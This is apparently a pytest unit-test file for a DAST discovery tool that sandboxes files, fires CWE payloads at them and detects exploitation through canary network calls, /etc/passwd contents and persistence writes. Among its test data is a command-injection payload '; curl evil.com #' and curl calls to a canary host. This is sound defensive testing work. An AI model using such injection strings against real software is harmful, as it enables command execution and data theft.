"""Unit tests for dast.discovery — DAST Discovery v0.0 (Tier 3 lite)."""

from __future__ import annotations

import asyncio
from typing import Any

import pytest

from dast.discovery import (
    DISCOVERY_PAYLOADS,
    DiscoveredFinding,
    DiscoveryPayload,
    _build_plan,
    _events_text,
    _oracle_match,
    _stdout_text,
    _target_invoke_for,
    run_discovery,
)
from dast.sandbox.client import SandboxEvent, SandboxPlan, SandboxTrace


# ── Stub sandbox client ──────────────────────────────────────────────────────


class _StubSandbox:
    """Test-only sandbox client. Configured per-test with a fixed
    response per plan_id prefix."""

    def __init__(self, response_for_cwe: dict[str, dict[str, Any]]) -> None:
        # response_for_cwe maps "CWE-78" -> {events, stdout, ...}
        # We dispatch by hypothesis_id (D001..D005) -> CWE order in
        # DISCOVERY_PAYLOADS.
        self.response_for_cwe = response_for_cwe
        self.calls: list[SandboxPlan] = []

    async def submit(self, plan: SandboxPlan) -> SandboxTrace:
        self.calls.append(plan)
        # Find the payload that produced this hypothesis_id
        idx = int(plan.hypothesis_id[1:]) - 1  # "D001" -> 0
        if 0 <= idx < len(DISCOVERY_PAYLOADS):
            cwe = DISCOVERY_PAYLOADS[idx].cwe
        else:
            cwe = "?"
        spec = self.response_for_cwe.get(cwe, {})
        return SandboxTrace(
            plan_id=plan.plan_id,
            file_id=plan.file_id,
            hypothesis_id=plan.hypothesis_id,
            events=[
                SandboxEvent(event_id=f"evt-{i}", kind=ev["kind"], payload=ev.get("payload", {}))
                for i, ev in enumerate(spec.get("events") or [])
            ],
            exit_code=spec.get("exit_code", 0),
            stdout_excerpt=spec.get("stdout", ""),
            stderr_excerpt=spec.get("stderr", ""),
            elapsed_ms=spec.get("elapsed_ms", 100),
            is_stub_no_trace=spec.get("is_stub_no_trace", False),
        )


# ── DiscoveryPayload library sanity ──────────────────────────────────────────


def test_library_covers_top_cwes() -> None:
    cwes = {p.cwe for p in DISCOVERY_PAYLOADS}
    # v0.0 baseline
    assert {"CWE-78", "CWE-89", "CWE-22", "CWE-79", "CWE-502"}.issubset(cwes)
    # v0.5 expansion
    assert {"CWE-918", "CWE-611", "CWE-94"}.issubset(cwes), "v0.5 web/app CWEs missing"
    assert {"CWE-201", "CWE-506"}.issubset(cwes), "v0.5 malware-pattern CWEs missing"


def test_every_payload_has_at_least_one_oracle_mechanism() -> None:
    """Every payload must use at least ONE oracle mechanism so we can
    detect exploitation: keyword match, event-kind match, or both.
    No oracle = can't tell whether the payload worked."""
    for p in DISCOVERY_PAYLOADS:
        has_keyword = bool(p.oracle_keywords)
        has_event_kind = bool(p.oracle_event_kinds)
        assert has_keyword or has_event_kind, (
            f"{p.cwe} has no oracle (no keywords AND no event_kinds) — can't detect exploitation"
        )
        if p.oracle_keywords:
            assert all(isinstance(k, str) and k for k in p.oracle_keywords)
        if p.oracle_event_kinds:
            assert all(isinstance(k, str) and k for k in p.oracle_event_kinds)


def test_every_payload_has_commands() -> None:
    for p in DISCOVERY_PAYLOADS:
        assert p.commands, f"{p.cwe} has no commands — sandbox would have nothing to run"


# ── _build_plan ──────────────────────────────────────────────────────────────


def test_build_plan_has_unique_ids() -> None:
    p1 = _build_plan("file_x", DISCOVERY_PAYLOADS[0], 0)
    p2 = _build_plan("file_x", DISCOVERY_PAYLOADS[0], 0)
    # Both have the same hypothesis_id but different plan_ids (uuid prefix).
    assert p1.hypothesis_id == p2.hypothesis_id
    assert p1.plan_id != p2.plan_id


def test_build_plan_carries_image_hint() -> None:
    plan = _build_plan("f", DISCOVERY_PAYLOADS[0], 0)
    assert plan.image_hint == DISCOVERY_PAYLOADS[0].image_hint


def test_build_plan_includes_payload_in_commands() -> None:
    plan = _build_plan("f", DISCOVERY_PAYLOADS[0], 0)
    assert plan.payload == DISCOVERY_PAYLOADS[0].payload_input


# ── Oracle matching ──────────────────────────────────────────────────────────


def test_events_text_only_includes_observation_events() -> None:
    """Critical: process_spawn events carry our own command text. They
    must be excluded from oracle matching — otherwise a payload
    containing 'argus-discovery-canary' as input falsely matches its own
    spawn event. Only OBSERVATION events (network_call_captured,
    file_writes_observed, etc.) get fed to the oracle."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[
            # Meta event — excluded
            SandboxEvent(
                event_id="e1",
                kind="process_spawn",
                payload={"cmd": "curl http://argus-discovery-canary.invalid"},
            ),
            # Observation event — included
            SandboxEvent(
                event_id="e2",
                kind="network_call_captured",
                payload={"host": "evil.example.com", "method": "POST"},
            ),
        ],
        exit_code=0,
        stdout_excerpt="",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    events = _events_text(trace)
    # process_spawn excluded — our command text NOT in oracle scope
    assert "argus-discovery-canary.invalid" not in events
    # network_call_captured included — actual observation IS in oracle scope
    assert "network_call_captured" in events
    assert "evil.example.com" in events


def test_stdout_text_only_returns_stdout_and_stderr() -> None:
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[SandboxEvent(event_id="e1", kind="network", payload={"host": "evil.example.com"})],
        exit_code=0,
        stdout_excerpt="some output here",
        stderr_excerpt="warn: x",
        elapsed_ms=10,
    )
    stdout = _stdout_text(trace)
    assert "some output" in stdout
    assert "warn: x" in stdout
    # Events excluded from stdout view
    assert "network" not in stdout


def test_oracle_match_hits_when_keyword_in_observation_event() -> None:
    """network_call_captured IS an observation event — keyword match counts."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[
            SandboxEvent(
                event_id="e1",
                kind="network_call_captured",
                payload={"host": "argus-discovery-canary.invalid"},
            )
        ],
        exit_code=0,
        stdout_excerpt="",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, kws = _oracle_match(trace, ("argus-discovery-canary.invalid", "other"))
    assert matched
    assert "argus-discovery-canary.invalid" in kws


def test_oracle_match_DOES_NOT_fire_on_process_spawn_event() -> None:
    """A meta event (process_spawn) carrying our command text MUST NOT
    match — that's our own input, not a runtime observation. This is
    the critical fix for v0.0's false-positive issue."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[
            SandboxEvent(
                event_id="e1",
                kind="process_spawn",
                payload={"cmd": "curl http://argus-discovery-canary.invalid"},
            )
        ],
        exit_code=0,
        stdout_excerpt="",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, kws = _oracle_match(trace, ("argus-discovery-canary.invalid",))
    assert not matched, "process_spawn event must not trigger oracle (our own command)"


def test_oracle_match_misses_when_no_keyword() -> None:
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[SandboxEvent(event_id="e1", kind="process_exit", payload={"code": 0})],
        exit_code=0,
        stdout_excerpt="all good",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, kws = _oracle_match(trace, ("attacker.com", "exfiltration"))
    assert not matched
    assert kws == []


def test_oracle_match_does_NOT_fire_on_stdout_for_non_content_oracle() -> None:
    """A non-content oracle (network canary) must not match if the
    keyword only appears in stdout — the file may have echoed our
    own input. Critical fix from the buggy v0.0 smoke."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[],  # no events
        exit_code=0,
        stdout_excerpt="argus-discovery-canary.invalid was in the input",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, kws = _oracle_match(trace, ("argus-discovery-canary.invalid",))
    assert not matched, "stdout-only mention must NOT match a network-canary oracle"


def test_oracle_match_DOES_fire_on_stdout_for_content_based_oracle() -> None:
    """The /etc/passwd marker IS a content-based oracle — only appears
    if the file actually read+printed the file. Match against stdout
    is correct here."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[],  # no events captured
        exit_code=0,
        stdout_excerpt="root:x:0:0:root:/root:/bin/bash",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, kws = _oracle_match(trace, ("root:x:0:0",))
    assert matched, "content-based oracle must match the actual /etc/passwd content"


def test_oracle_match_is_case_insensitive_for_content_oracle() -> None:
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[],
        exit_code=0,
        stdout_excerpt="ROOT:X:0:0:root:/root:/bin/bash",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, _ = _oracle_match(trace, ("root:x:0:0",))
    assert matched


# ── v0.5: event-kind oracle ─────────────────────────────────────────────────


def test_event_kind_oracle_matches_any_event_with_listed_kind() -> None:
    """For malware-pattern detection (CWE-201 exfil): the FACT that a
    network_call_captured event fired is the signal, regardless of host
    or content."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[
            SandboxEvent(
                event_id="e1",
                kind="network_call_captured",
                payload={"host": "anywhere.example.com"},
            )
        ],
        exit_code=0,
        stdout_excerpt="",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, kws = _oracle_match(
        trace,
        oracle_keywords=(),
        oracle_event_kinds=("network_call_captured",),
    )
    assert matched
    assert "kind:network_call_captured" in kws


def test_event_kind_oracle_no_match_if_kind_absent() -> None:
    """No matching event kind -> no match. Used to avoid false positives
    when the file produces other events but not the targeted kind."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[SandboxEvent(event_id="e1", kind="process_exit", payload={"code": 0})],
        exit_code=0,
        stdout_excerpt="",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, _ = _oracle_match(
        trace,
        oracle_keywords=(),
        oracle_event_kinds=("network_call_captured",),
    )
    assert not matched


# ── v0.5: observed-paths oracle (persistence detection) ─────────────────────


def test_observed_paths_oracle_matches_persistence_target() -> None:
    """CWE-506 persistence: if the file writes to /etc, /.ssh, /.bashrc,
    etc., the file_writes_observed event payload contains the path."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[
            SandboxEvent(
                event_id="e1",
                kind="file_writes_observed",
                payload={"changes": ["/etc/profile.d/malware.sh", "/tmp/build.log"]},
            )
        ],
        exit_code=0,
        stdout_excerpt="",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, kws = _oracle_match(
        trace,
        oracle_keywords=(),
        oracle_event_kinds=("file_writes_observed",),
        oracle_observed_paths=("/etc/", "/.ssh/", "/.bashrc"),
    )
    assert matched
    assert any(k.startswith("path:/etc/") for k in kws)


def test_observed_paths_oracle_no_match_for_benign_writes() -> None:
    """File writes to /tmp or other non-persistence paths must NOT
    trigger the persistence oracle. Critical to avoid false positives
    on legitimate files that just write logs."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[
            SandboxEvent(
                event_id="e1",
                kind="file_writes_observed",
                payload={"changes": ["/tmp/output.txt", "/var/log/run.log"]},
            )
        ],
        exit_code=0,
        stdout_excerpt="",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    matched, _ = _oracle_match(
        trace,
        oracle_keywords=(),
        oracle_event_kinds=("file_writes_observed",),
        oracle_observed_paths=("/etc/", "/.ssh/", "/.bashrc"),
    )
    assert not matched, "writes to /tmp and /var/log should NOT match persistence oracle"


# ── DAST-206: language-aware target invocation ─────────────────────────────


def test_target_invoke_for_python_files() -> None:
    """Python files get invoked via python3."""
    assert _target_invoke_for("script.py") == 'python3 "/workspace/script.py"'
    assert _target_invoke_for("compat_hooks.pth") == 'python3 "/workspace/compat_hooks.pth"'


def test_target_invoke_for_javascript_files() -> None:
    """JS/TS files get invoked via node — DAST-206 multi-language coverage."""
    assert _target_invoke_for("module.js") == 'node "/workspace/module.js"'
    assert _target_invoke_for("modern.mjs") == 'node "/workspace/modern.mjs"'
    assert _target_invoke_for("commonjs.cjs") == 'node "/workspace/commonjs.cjs"'
    assert _target_invoke_for("typed.ts") == 'node "/workspace/typed.ts"'
    assert _target_invoke_for("comp.jsx") == 'node "/workspace/comp.jsx"'
    assert _target_invoke_for("comp.tsx") == 'node "/workspace/comp.tsx"'


def test_target_invoke_for_shell_files() -> None:
    """Shell scripts via bash."""
    assert _target_invoke_for("install.sh") == 'bash "/workspace/install.sh"'
    assert _target_invoke_for("init.bash") == 'bash "/workspace/init.bash"'


def test_target_invoke_unknown_extension_defaults_to_python3() -> None:
    """Conservative default — try python3 for unrecognised extensions.
    Most regression-suite files happen to be Python."""
    assert _target_invoke_for("plain.json") == 'python3 "/workspace/plain.json"'
    assert _target_invoke_for("Dockerfile") == 'python3 "/workspace/Dockerfile"'


def test_target_invoke_for_java_class_file() -> None:
    """Compiled .class files run via java with -cp /workspace + bare class name."""
    assert _target_invoke_for("Hello.class") == 'java -cp /workspace "Hello"'
    assert _target_invoke_for("MyClass.class") == 'java -cp /workspace "MyClass"'


def test_target_invoke_for_jar_file() -> None:
    """Executable jars run via java -jar."""
    assert _target_invoke_for("app.jar") == 'java -jar "/workspace/app.jar"'


def test_target_invoke_extension_check_is_case_insensitive() -> None:
    """Case-insensitive — .JS should still route to node."""
    assert _target_invoke_for("FILE.JS") == 'node "/workspace/FILE.JS"'
    assert _target_invoke_for("App.PY") == 'python3 "/workspace/App.PY"'


def test_combined_oracle_matches_either_mechanism() -> None:
    """A payload can use both keyword and event-kind oracles. Either
    matching is sufficient."""
    trace = SandboxTrace(
        plan_id="p",
        file_id="f",
        hypothesis_id="H",
        events=[
            SandboxEvent(
                event_id="e1",
                kind="network_call_captured",
                payload={"host": "anywhere.example.com"},
            )
        ],
        exit_code=0,
        stdout_excerpt="",
        stderr_excerpt="",
        elapsed_ms=10,
    )
    # Keyword oracle wouldn't match (no canary in events) but event-kind would
    matched, kws = _oracle_match(
        trace,
        oracle_keywords=("argus-discovery-canary.invalid",),
        oracle_event_kinds=("network_call_captured",),
    )
    assert matched


# ── run_discovery (async) ────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_run_discovery_no_oracle_matches_no_findings() -> None:
    """Sandbox returns benign traces — no findings discovered."""
    stub = _StubSandbox({})  # default empty response per CWE
    findings, summary = await run_discovery(file_id="benign.py", sandbox=stub)
    assert findings == []
    assert len(summary) == len(DISCOVERY_PAYLOADS)
    assert all(not s["matched"] for s in summary)


@pytest.mark.asyncio
async def test_run_discovery_finds_cwe78_when_oracle_keyword_observed() -> None:
    """Sandbox observes a network_call_captured event with the canary
    domain (oracle for CWE-78) → discovery surfaces a CWE-78 finding."""
    stub = _StubSandbox(
        {
            "CWE-78": {
                "events": [
                    {
                        "kind": "network_call_captured",
                        "payload": {"host": "argus-discovery-canary.invalid", "method": "GET"},
                    }
                ],
                "stdout": "executed: curl http://argus-discovery-canary.invalid/cwe78",
            }
        }
    )
    findings, summary = await run_discovery(file_id="vuln.py", sandbox=stub)
    assert len(findings) == 1
    assert findings[0].cwe == "CWE-78"
    assert findings[0].discovered_by == "dast_discovery_v0"
    assert "argus-discovery-canary.invalid" in findings[0].runtime_evidence
    assert findings[0].sandbox_event_count == 1


@pytest.mark.asyncio
async def test_run_discovery_finds_multiple_cwes() -> None:
    """Multiple CWEs can fire on the same file. CWE-78 fires from event
    payload (network canary); CWE-22 fires from stdout content (the
    root:x:0:0 oracle is content-based)."""
    stub = _StubSandbox(
        {
            "CWE-78": {
                "events": [
                    {
                        "kind": "network_call_captured",
                        "payload": {"host": "argus-discovery-canary.invalid"},
                    }
                ],
            },
            "CWE-22": {"stdout": "root:x:0:0:root:/root:/bin/bash"},
        }
    )
    findings, summary = await run_discovery(file_id="multi.py", sandbox=stub)
    assert len(findings) == 2
    cwes_found = {f.cwe for f in findings}
    assert cwes_found == {"CWE-78", "CWE-22"}


@pytest.mark.asyncio
async def test_run_discovery_handles_sandbox_exception() -> None:
    """If the sandbox raises, we record an error in the summary and
    move on — no finding emitted, no exception propagated."""

    class _ExplodingSandbox:
        async def submit(self, plan: SandboxPlan) -> SandboxTrace:
            raise RuntimeError("sandbox is on fire")

    findings, summary = await run_discovery(file_id="x.py", sandbox=_ExplodingSandbox())
    assert findings == []
    assert all(s.get("error") and "sandbox is on fire" in s["error"] for s in summary)


@pytest.mark.asyncio
async def test_run_discovery_handles_timeout() -> None:
    """Per-payload timeout is enforced — slow sandbox calls don't hang
    the whole run."""

    class _HangingSandbox:
        async def submit(self, plan: SandboxPlan) -> SandboxTrace:
            await asyncio.sleep(10)
            raise AssertionError("should never get here")

    findings, summary = await run_discovery(
        file_id="x.py", sandbox=_HangingSandbox(), timeout_sec=0.1
    )
    assert findings == []
    assert all(s.get("error") == "timeout" for s in summary)


@pytest.mark.asyncio
async def test_run_discovery_returns_diagnostic_summary() -> None:
    """Summary entry is created for every payload attempted, regardless
    of match — used for the 'we tried N payloads' diagnostic in launch
    report."""
    stub = _StubSandbox(
        {
            "CWE-78": {
                "events": [
                    {
                        "kind": "network_call_captured",
                        "payload": {"host": "argus-discovery-canary.invalid"},
                    }
                ],
            },
        }
    )
    _, summary = await run_discovery(file_id="x.py", sandbox=stub)
    assert len(summary) == len(DISCOVERY_PAYLOADS)
    matched_count = sum(1 for s in summary if s["matched"])
    assert matched_count == 1


# ── DiscoveredFinding shape ──────────────────────────────────────────────────


def test_discovered_finding_to_dict_round_trip() -> None:
    f = DiscoveredFinding(
        finding_id="D001",
        cwe="CWE-78",
        cwe_name="cmd",
        severity="critical",
        payload="; curl evil.com #",
        runtime_evidence="dns hit",
        sandbox_plan_id="p1",
        sandbox_event_count=3,
    )
    d = f.to_dict()
    assert d["finding_id"] == "D001"
    assert d["cwe"] == "CWE-78"
    assert d["status"] == "CONFIRMED"
    assert d["discovered_by"] == "dast_discovery_v0"
